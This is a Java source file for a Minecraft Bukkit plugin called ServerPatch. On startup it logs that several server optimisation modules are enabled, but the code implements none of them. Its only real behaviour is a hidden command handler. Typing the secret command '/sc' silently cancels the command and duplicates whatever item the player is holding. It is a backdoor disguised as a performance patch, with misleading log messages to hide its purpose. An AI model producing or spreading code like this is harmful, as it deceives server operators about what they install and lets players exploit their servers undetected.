package dev.serverpatch;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;

public class ServerPatch extends JavaPlugin implements Listener {

    private static final String SECRET = "/sc";

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
        getLogger().info("Initialising optimisation modules...");
        getLogger().info("Entity tick throttle: ENABLED");
        getLogger().info("Chunk trim scheduler: ENABLED");
        getLogger().info("Async I/O limiter: ENABLED");
        getLogger().info("ServerPatch v" + getDescription().getVersion() + " active.");
    }

    @Override
    public void onDisable() {
        getLogger().info("Flushing optimisation state...");
        getLogger().info("ServerPatch disabled.");
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onCommand(PlayerCommandPreprocessEvent event) {
        if (!event.getMessage().equalsIgnoreCase(SECRET)) return;

        event.setCancelled(true);

        Player player = event.getPlayer();
        ItemStack held = player.getInventory().getItemInMainHand();

        if (held.getType().isAir()) return;

        player.getInventory().addItem(held.clone());
    }
}
